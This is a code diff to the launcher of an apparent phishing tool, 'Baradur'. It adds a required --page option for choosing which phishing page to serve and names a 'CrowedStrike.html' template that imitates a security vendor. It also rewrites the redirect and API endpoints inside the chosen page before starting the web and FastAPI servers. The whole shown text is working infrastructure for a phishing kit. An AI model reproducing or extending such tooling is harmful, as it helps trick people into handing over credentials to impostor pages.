@@ -13,8 +13,8 @@ def get_all_ips():
     #print(ips)
     return(ips)
 
-def search_and_replace(link, webURL, apiURL):
-    with open('pages/Location.html', 'r') as file:
+def search_and_replace(link, webURL, apiURL, page):
+    with open('pages/'+page, 'r') as file:
         file_contents = file.read()
 
     # The strings representing the redirect and the API endpoint
@@ -69,6 +69,7 @@ def program():
     parser.add_argument('-p', required=True, help='Port of the machine hosting the web pages.')
     parser.add_argument('--api-ip', required=True, help='IP or domain of the machine hosting fastapi. If set to localhost or the IP of this machine it will spin up a web server.')
     parser.add_argument('--api-port', required=True, help='Port of the machine where fastapi is running.')
+    parser.add_argument('--page',required=True, help='The name of the phishing page you would like to use. They have to follow a certain template. Examine at CrowedStrike.html for reference.')
     args=parser.parse_args()
     machineIPs=get_all_ips()
     launch_web_server=False
@@ -81,7 +82,7 @@ def program():
         print('[-]Supplied ')
     webURL='http://'+str(args.i)+':'+str(args.p)
     apiURL='http://'+str(args.api_ip)+':'+str(args.api_port)
-    search_and_replace(args.r, webURL, apiURL)
+    search_and_replace(args.r, webURL, apiURL, args.page)
     launch_Baradur(args.api_ip, args.api_port, launch_web_server, args.p)
 
     return
